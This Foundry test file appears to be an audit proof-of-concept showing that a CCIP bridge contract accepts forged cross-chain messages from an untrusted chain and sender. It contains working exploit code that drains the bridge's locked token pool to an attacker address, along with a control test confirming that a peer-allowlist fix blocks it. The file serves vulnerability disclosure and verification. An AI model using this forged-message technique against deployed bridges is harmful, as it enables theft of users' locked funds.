// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {BridgeCCIP, BridgeCCIPFixed} from "../src/yieldfi/BridgeCCIP.sol";
import {BridgeToken} from "../src/yieldfi/BridgeToken.sol";
import {Constants} from "../src/yieldfi/Constants.sol";
import {Client} from "../src/chainlink/Client.sol";

/// @dev The opaque CCIP boundary (the real Chainlink Router is out of scope). It
/// is the configured `i_ccipRouter`, so `CCIPReceiver.onlyRouter` accepts it —
/// exactly as the real OffRamp would. Chainlink CCIP delivers messages from ANY
/// source chain / ANY sender that paid on that chain; the router does NOT vouch
/// for the source's trustworthiness. We therefore legitimately deliver a message
/// whose `sourceChainSelector` and `sender` are attacker-controlled. This is the
/// finding: the receiver never validates those fields.
contract RouterDouble {
    function deliver(
        address dest,
        bytes32 messageId,
        uint64 sourceChainSelector,
        address sender,
        bytes memory data
    ) external {
        Client.Any2EVMMessage memory m = Client.Any2EVMMessage({
            messageId: messageId,
            sourceChainSelector: sourceChainSelector,
            sender: abi.encode(sender),
            data: data,
            destTokenAmounts: new Client.EVMTokenAmount[](0)
        });
        (bool ok, bytes memory ret) =
            dest.call(abi.encodeWithSignature("ccipReceive((bytes32,uint64,bytes,bytes,(address,uint256)[]))", m));
        if (!ok) {
            assembly { revert(add(ret, 0x20), mload(ret)) }
        }
    }
}

contract PoC_55536_MissingSourceValidation is Test {
    RouterDouble internal router;
    BridgeCCIP internal bridge; // L1 bridge holding a pool of locked yTokens
    BridgeToken internal yToken;

    // Attacker-controlled identities on an UNTRUSTED source chain.
    uint64 internal constant ATTACKER_CHAIN = 424242; // some random CCIP-connected chain
    address internal attackerSourceContract = 0xbaD0BAd0bAD0BAd0BAd0BAD0BaD0BaD0Bad0baD0;
    address internal attacker = address(0xA77AC000);

    uint256 internal constant LOCKED_POOL = 1_000 ether;

    function setUp() public {
        router = new RouterDouble();
        yToken = new BridgeToken();
        bridge = new BridgeCCIP(address(router), true, address(yToken));
        // The bridge holds the locked cross-chain pool (what legitimate senders locked).
        yToken.mint(address(bridge), LOCKED_POOL);
    }

    /// Craft the custom payload exactly as the bridge decodes it. `dstId` is kept
    /// within uint32 range so decoding succeeds (isolating this finding from the
    /// separate uint32/uint64 decode bug, #55537). Everything is attacker-chosen.
    function _forgedMessageData(address to, uint256 amount) internal view returns (bytes memory) {
        bytes memory inner = abi.encode(
            uint64(1), // dstId (in uint32 range -> decodes)
            to, // to = attacker's address
            address(yToken), // token (must be a contract)
            amount,
            Constants.BRIDGE_SEND_HASH
        );
        return abi.encode(inner); // BridgeCCIP does abi.decode(data,(bytes)) first
    }

    function test_untrustedSourceCanDrainBridge() public {
        assertEq(yToken.balanceOf(attacker), 0);
        assertEq(yToken.balanceOf(address(bridge)), LOCKED_POOL);

        bytes memory data = _forgedMessageData(attacker, LOCKED_POOL);

        // Attacker's forged message arrives from an UNTRUSTED chain + sender.
        // The vulnerable bridge processes it with no source validation.
        router.deliver(address(bridge), keccak256("m1"), ATTACKER_CHAIN, attackerSourceContract, data);

        // HARM: the entire locked pool was released to the attacker on a message
        // that no legitimate source chain ever sent.
        assertEq(yToken.balanceOf(attacker), LOCKED_POOL, "attacker did not receive drained tokens");
        assertEq(yToken.balanceOf(address(bridge)), 0, "bridge pool not drained");
    }

    /// Negative control: the report's Recommended Mitigation (allowedPeers) makes
    /// the IDENTICAL untrusted delivery revert, and even after whitelisting a
    /// DIFFERENT legitimate peer the attacker's message is still rejected.
    function test_control_fixedBridgeRejectsUntrustedSource() public {
        BridgeCCIPFixed fixedBridge = new BridgeCCIPFixed(address(router), true, address(yToken));
        yToken.mint(address(fixedBridge), LOCKED_POOL);

        // whitelist only the real peer on the real source chain
        fixedBridge.setAllowedPeer(1, address(0x1234567890123456789012345678901234567890), true);

        bytes memory data = _forgedMessageData(attacker, LOCKED_POOL);

        vm.expectRevert(bytes("allowed"));
        router.deliver(address(fixedBridge), keccak256("m2"), ATTACKER_CHAIN, attackerSourceContract, data);

        assertEq(yToken.balanceOf(attacker), 0, "fix must block the drain");
        assertEq(yToken.balanceOf(address(fixedBridge)), LOCKED_POOL, "pool must be intact under the fix");
    }
}
